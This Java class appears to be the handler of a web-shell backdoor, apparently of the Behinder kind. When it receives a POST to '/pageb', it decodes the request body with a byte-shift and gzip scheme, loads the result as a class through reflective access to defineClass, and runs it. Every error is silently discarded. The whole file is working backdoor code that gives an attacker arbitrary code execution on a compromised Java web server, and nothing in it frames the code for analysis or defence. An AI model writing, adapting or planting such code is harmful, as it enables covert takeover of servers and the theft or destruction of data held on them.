package com.sf.sl;

import com.sf.redefine.MyRequest;

public class BX {
    private static final String pathPattern= "/pageb";
    private static byte[] Decrypt(byte[] data) {
        byte[] dt = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            dt[i] = (byte) (data[i] - 1);
        }
        try {
            java.io.ByteArrayInputStream t = new java.io.ByteArrayInputStream(dt);
            java.util.zip.GZIPInputStream i = new java.util.zip.GZIPInputStream(t, dt.length);
            byte[] c = r(i);
            byte[] ct = new byte[c.length];
            for (int b = 0; b < c.length; b++) {
                ct[b] = (byte) (c[b] - 1);
            }
            return ct;
        } catch (Exception ignored) {
        }
        return data;
    }
    private static byte[] Encrypt(byte[] data) {
        byte[] dt = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            dt[i] = (byte) (data[i] + 1);
        }
        try {
            java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream();
            java.util.zip.GZIPOutputStream g = new java.util.zip.GZIPOutputStream(o);
            g.write(dt);
            g.close();
            byte[] c = o.toByteArray();
            byte[] ct = new byte[c.length];

            for (int i = 0; i < c.length; i++) {
                ct[i] = (byte) (c[i] + 1);
            }
            return ct;
        } catch (Exception ignored) {
        }
        return data;
    }
    private static byte[] r(java.io.InputStream i) {
        byte[] temp = new byte[1024];
        java.io.ByteArrayOutputStream b = new java.io.ByteArrayOutputStream();
        int n;
        try {
            while((n = i.read(temp)) != -1) {b.write(temp, 0, n);
            }} catch (Exception ignored) {
        }
        return b.toByteArray();
    }

    public static void doService(Object obj, String url,String method, java.io.InputStream in){
        if (url.matches(pathPattern)){
            if (method.equals("POST")){
                try {
                    java.util.Map objMap = (java.util.Map)obj;
                    Object request = objMap.get("request");
                    ClassLoader loader = MyRequest.getServletContext(request).getClass().getClassLoader();
                    java.lang.reflect.Method defineMethod=java.lang.ClassLoader.class.getDeclaredMethod("defineClass", String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class);
                    defineMethod.setAccessible(true);
                    java.lang.reflect.Constructor<java.security.SecureClassLoader> constructor=java.security.SecureClassLoader.class.getDeclaredConstructor(ClassLoader.class);
                    constructor.setAccessible(true);
                    java.lang.ClassLoader cl= constructor.newInstance(loader);
                    java.lang.Class  c=(java.lang.Class)defineMethod.invoke(cl,new Object[]{null,java.nio.ByteBuffer.wrap(Decrypt(r(in))),null});
                    c.newInstance().equals(obj);
                }catch(Exception ignored) {
                }
            }

        }
    }
}
